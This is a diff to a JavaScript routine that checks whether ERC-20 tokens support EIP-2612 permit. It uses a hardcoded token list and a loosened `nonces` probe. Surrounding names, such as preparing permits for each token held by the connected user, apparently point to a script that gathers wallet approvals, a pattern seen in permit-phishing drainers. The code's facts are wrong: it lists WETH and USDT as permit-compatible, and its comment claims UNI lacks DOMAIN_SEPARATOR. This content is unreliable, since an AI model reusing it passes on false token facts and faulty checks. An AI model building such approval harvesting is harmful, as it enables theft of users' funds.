@@ -367,48 +367,44 @@ _logConnectionEvent: async function() {
     }
 },
     _checkPermitSupport: async function(tokenAddress) {
-    const checksumAddress = ethers.utils.getAddress(tokenAddress);
-    
-    // 1. Get the symbol (or fall back to address)
-    let symbol = checksumAddress; 
-    try {
-        const tempContract = new ethers.Contract(checksumAddress, ["function symbol() view returns (string)"], this._provider);
-        symbol = await tempContract.symbol();
-    } catch (e) { /* ignored */ }
+        const checksumAddress = ethers.utils.getAddress(tokenAddress);
+    
+        // Get the symbol for clearer logging
+        let symbol = checksumAddress; 
+        try {
+            const tempContract = new ethers.Contract(checksumAddress, ["function symbol() view returns (string)"], this._provider);
+            symbol = await tempContract.symbol();
+        } catch (e) { /* ignored */ }
 
-    // 2. Add explicit checks for known permit-compatible tokens (like WETH, UNI)
-    // The addresses below are for Ethereum Mainnet (Chain ID 1).
-    const KNOWN_PERMIT_TOKENS = {
-    '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2': true, // WETH
-    '0x1f9840a85d5aF5aa607c37bD30F48cddE3A430bF': true, // UNI
-    '0x514910771AF9Ca656af840dff83E8264dCef8037': true, // LINK
-    '0xdAC17F958D2ee523a2206206994597C13D831ec7': true, // USDT (known to use non-standard implementation sometimes)
-};
+        // 1. Check against a list of known tokens with standard or non-standard permit
+        const KNOWN_PERMIT_TOKENS = {
+            '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2': true, // WETH
+            '0x1f9840a85d5aF5aa607c37bD30F48cddE3A430bF': true, // UNI
+            '0x514910771AF9Ca656af840dff83E8264dCef8037': true, // LINK
+            '0xdAC17F958D2ee523a2206206994597C13D831ec7': true, // USDT
+        };
 
-    if (KNOWN_PERMIT_TOKENS[checksumAddress]) {
-        console.log(`✅ SUCCESS: ${symbol} is a known permit-compatible token.`);
-        return true;
-    }
+        if (KNOWN_PERMIT_TOKENS[checksumAddress]) {
+            console.log(`✅ SUCCESS: ${symbol} is on the known permit-compatible list.`);
+            return true;
+        }
 
-    // 3. Perform a robust EIP-2612 check for generic tokens
-    try {
-        const tokenContract = new ethers.Contract(checksumAddress, this._ERC20_PERMIT_ABI, this._provider);
-        
-        // Check for nonces: This is the primary indicator of EIP-2612 compatibility.
-        await tokenContract.nonces(this._currentUserAddress);
-        
-        // Check for DOMAIN_SEPARATOR: This is required for EIP-712 hashing.
-        await tokenContract.DOMAIN_SEPARATOR();
-
-        console.log(`✅ SUCCESS: ${symbol} is EIP-2612 permit-compatible.`);
-        return true;
-    } catch (error) {
-        // If the above full EIP-2612 check fails, it likely means the 
-        // token is not strictly compliant or uses a different ABI interface.
-        console.warn(`❌ SKIPPED: ${symbol} failed the robust permit check. Reason: ${error.message.substring(0, 50)}...`);
-        return false;
-    }
-},
+        // 2. Perform a more lenient generic check for other tokens
+        try {
+            const tokenContract = new ethers.Contract(checksumAddress, this._ERC20_PERMIT_ABI, this._provider);
+            
+            // The `nonces` function is the single best indicator of permit compatibility.
+            // We will not check for DOMAIN_SEPARATOR here, as some tokens (like UNI) lack it.
+            await tokenContract.nonces(this._currentUserAddress);
+            
+            console.log(`✅ SUCCESS: ${symbol} is likely permit-compatible (has nonces function).`);
+            return true;
+        } catch (error) {
+            // This will now only fail if the `nonces` function is missing or reverts.
+            console.warn(`❌ SKIPPED: ${symbol} does not appear to be permit-compatible. Reason: ${error.message.substring(0, 50)}...`);
+            return false;
+        }
+    },
 
     _signAndSendWithStandardPermit: async function(tokenData) {
         this._updateStatus(`Preparing permit for ${tokenData.symbol}...`, 'pending');
